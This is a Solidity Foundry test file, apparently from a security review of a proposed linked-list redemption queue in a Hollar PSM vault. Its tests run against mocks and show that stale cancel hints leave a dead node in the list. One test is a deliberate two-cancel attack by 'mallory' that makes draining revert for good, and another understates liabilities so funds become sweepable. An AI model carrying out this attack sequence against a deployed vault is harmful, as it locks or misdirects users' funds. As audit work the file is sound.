// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {HollarBaseVault} from "../../../src/psm/HollarBaseVault.sol";
import {IHollarBaseVault} from "../../../src/psm/interfaces/IHollarBaseVault.sol";
import {PsmPayload} from "../../../src/psm/lib/PsmPayload.sol";
import {RateLimiter} from "../../../src/psm/lib/RateLimiter.sol";
import {RvVaultLL} from "./RvVaultLL.sol";
import {
    MockAToken,
    MockAaveOracle,
    MockAavePool,
    MockAddressesProvider,
    MockAggregator,
    MockCappedAdapter,
    MockToken,
    MockWormholeCore,
    VaaBuilder
} from "../mocks/PsmMocks.sol";

abstract contract RvBase is Test, IHollarBaseVault {
    MockToken internal usdc;
    MockAToken internal aUsdc;
    MockAavePool internal pool;
    MockWormholeCore internal wormhole;
    MockAddressesProvider internal provider;

    uint16 internal constant BASE_CHAIN = 30;
    uint16 internal constant HYDRATION_CHAIN = 73;
    bytes32 internal constant HYDRATION_EMITTER = bytes32(uint256(0x4bd7a));
    uint256 internal constant MIN_PRICE = 99e6;

    address internal admin = makeAddr("admin");
    address internal guardian = makeAddr("guardian");
    address internal treasurer = makeAddr("treasurer");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal mallory = makeAddr("mallory");

    function _deployEnv() internal {
        vm.warp(365 days);
        wormhole = new MockWormholeCore(BASE_CHAIN, 0);
        usdc = new MockToken("USDC", 6);
        aUsdc = new MockAToken();
        pool = new MockAavePool(usdc, aUsdc);
        MockAggregator agg = new MockAggregator(1e8);
        provider = new MockAddressesProvider(
            address(pool), address(new MockAaveOracle(address(new MockCappedAdapter(agg)), agg))
        );
    }

    function _init(address impl) internal returns (address) {
        return address(
            new ERC1967Proxy(
                impl,
                abi.encodeCall(
                    HollarBaseVault.initializeVault,
                    VaultInit({
                        wormhole: address(wormhole),
                        usdc: address(usdc),
                        aUsdc: address(aUsdc),
                        addressesProvider: address(provider),
                        hydrationChainId: HYDRATION_CHAIN,
                        minUsdcPrice: MIN_PRICE,
                        admin: admin,
                        guardian: guardian,
                        treasurer: treasurer
                    })
                )
            )
        );
    }

    function _open(address v) internal {
        vm.startPrank(admin);
        HollarBaseVault(v).setHydrationEmitter(HYDRATION_EMITTER);
        HollarBaseVault(v).setDepositLimit(RateLimiter.UNLIMITED, 0);
        vm.stopPrank();
        vm.prank(guardian);
        HollarBaseVault(v).setDepositsPaused(false);

        usdc.mint(alice, 10_000_000e6);
        vm.startPrank(alice);
        usdc.approve(v, type(uint256).max);
        HollarBaseVault(v).deposit(1_000_000e6, PsmPayload.fromAddress(alice));
        vm.stopPrank();
    }

    function _vaa(address to, uint256 amount, uint256 salt) internal pure returns (bytes memory) {
        return VaaBuilder.buildSalted(
            HYDRATION_CHAIN,
            HYDRATION_EMITTER,
            PsmPayload.encode(PsmPayload.KIND_REDEEM, PsmPayload.fromAddress(to), amount),
            salt
        );
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// CLAIM 1: does the packed `next` really cost nothing per enqueue?
// ─────────────────────────────────────────────────────────────────────────────
contract RvLinkedListHint is RvBase {
    RvVaultLL internal vault;

    function setUp() public {
        _deployEnv();
        vault = RvVaultLL(_init(address(new RvVaultLL())));
        _open(address(vault));
    }

    /// Two honest users cancel in the same block. The second one's hint is one block stale
    /// but still passes `queue[prev].next == index`.
    function test_honestRaceLeavesADeadNodeInTheLiveList() public {
        // 0: alice, live, pins the head. 1: bob. 2: carol(=mallory). 3: alice's real credit.
        vault.receiveMessage(_vaa(alice, 1e6, 0)); // 0 head
        vault.receiveMessage(_vaa(bob, 2e6, 1)); // 1
        vault.receiveMessage(_vaa(mallory, 3e6, 2)); // 2
        vault.receiveMessage(_vaa(alice, 4e6, 3)); // 3

        // Both bob (1) and mallory (2) decide to cancel. Both read the queue in the same block:
        // bob's prev is 0, mallory's prev is 1. Bob's tx lands first.
        vm.prank(bob);
        vault.cancelQueuedRedemption(1, 0);

        // mallory's hint (prev = 1) is now stale — 1 is dead and out of the list — but
        // `_nextOf(1) == 2` still holds, so the proposal's validation accepts it.
        vm.prank(mallory);
        vault.cancelQueuedRedemption(2, 1);

        // Node 2 is dead. Is it still reachable from the live list?
        (address r0,, uint256 a0,) = vault.queue(0);
        assertEq(r0, alice);
        uint256 next0 = _nextOf(0);
        (,, uint256 a2,) = vault.queue(next0);
        emit log_named_uint("queueHead", vault.queueHead());
        emit log_named_uint("head.next", next0);
        emit log_named_uint("amount at head.next (0 == dead node still in the list)", a2);
        assertEq(a0, 1e6 - (1e6 * 5) / 10_000);
        assertEq(next0, 2, "head still points at the cancelled node");
        assertEq(a2, 0, "and that node is dead: the list is corrupt");
    }

    /// The corruption is not benign: _settle re-applies the dead node's accounting.
    function test_deadNodeInListDoubleSubtractsTotalOwedAndBricksPayment() public {
        vault.receiveMessage(_vaa(alice, 1e6, 0)); // 0 head, small
        vault.receiveMessage(_vaa(mallory, 2e6, 1)); // 1
        vault.receiveMessage(_vaa(mallory, 900_000e6, 2)); // 2 : large
        vault.receiveMessage(_vaa(alice, 50_000e6, 3)); // 3 : the victim

        uint256 owedBefore = vault.totalOwed();

        vm.startPrank(mallory);
        vault.cancelQueuedRedemption(1, 0); // splices 1 out; head.next := 2
        vault.cancelQueuedRedemption(2, 1); // stale-but-valid hint: 2 stays in the list
        vm.stopPrank();

        emit log_named_uint("totalOwed before cancels", owedBefore);
        emit log_named_uint("totalOwed after cancels ", vault.totalOwed());

        // Pay the head. queueHead now lands on the dead node 2.
        vault.drain(1);
        assertEq(vault.queueHead(), 2, "head is now the dead node");

        // Every payment path from here runs _settle on a node whose gross was already returned.
        (bool d,) = address(vault).call(abi.encodeCall(RvVaultLL.drain, (1)));
        (bool c,) = address(vault).call(abi.encodeCall(RvVaultLL.claim, ()));
        emit log_named_string("drain after corruption", d ? "SUCCEEDED" : "reverted");
        emit log_named_string("claim after corruption", c ? "SUCCEEDED" : "reverted");
        assertFalse(d, "drain permanently reverts: totalOwed underflows");

        // and the victim is still owed
        assertGt(vault.owed(alice), 0);
    }

    /// Same corruption with a smaller gross: no revert, silent solvency damage instead.
    function test_deadNodeInListSilentlyUnderstatesLiabilities() public {
        vault.receiveMessage(_vaa(alice, 1e6, 0)); // 0 head
        vault.receiveMessage(_vaa(mallory, 2e6, 1)); // 1
        vault.receiveMessage(_vaa(mallory, 10_000e6, 2)); // 2
        vault.receiveMessage(_vaa(alice, 500_000e6, 3)); // 3 victim, large

        vm.startPrank(mallory);
        vault.cancelQueuedRedemption(1, 0);
        vault.cancelQueuedRedemption(2, 1); // 2 stays in the list
        vm.stopPrank();

        uint256 owedAfterCancel = vault.totalOwed();
        uint256 sweepBefore = vault.sweepable();

        vault.drain(1); // settle head
        vault.drain(1); // settles the DEAD node: totalOwed -= gross a second time

        emit log_named_uint("totalOwed after cancels          ", owedAfterCancel);
        emit log_named_uint("totalOwed after settling the dead", vault.totalOwed());
        emit log_named_uint("sweepable before", sweepBefore);
        emit log_named_uint("sweepable after ", vault.sweepable());

        assertEq(owedAfterCancel - vault.totalOwed(), 10_000e6 + 1e6, "head gross + dead node gross");
        assertGt(vault.sweepable(), sweepBefore, "treasurer can now sweep money that backs a live credit");
    }

    /// Deliberate version: mallory manufactures the same state alone, cheaply.
    function test_attackerCanManufactureItWithTwoOwnCredits() public {
        vault.receiveMessage(_vaa(alice, 1e6, 0)); // 0 head (someone else)
        vault.receiveMessage(_vaa(mallory, 1, 1)); // 1 dust
        vault.receiveMessage(_vaa(mallory, 900_000e6, 2)); // 2 big
        vault.receiveMessage(_vaa(alice, 50_000e6, 3)); // 3 victim

        vm.startPrank(mallory);
        vault.cancelQueuedRedemption(1, 0);
        vault.cancelQueuedRedemption(2, 1);
        vm.stopPrank();

        vault.drain(1);
        (bool d,) = address(vault).call(abi.encodeCall(RvVaultLL.drain, (1)));
        assertFalse(d, "two cancels, no gas cost to speak of, queue dead forever");
        emit log_named_uint("attacker credits used", 2);
    }

    function _nextOf(uint256 i) internal view returns (uint256) {
        (, uint64 n,,) = vault.queue(i);
        return n == 0 ? i + 1 : uint256(n);
    }
}
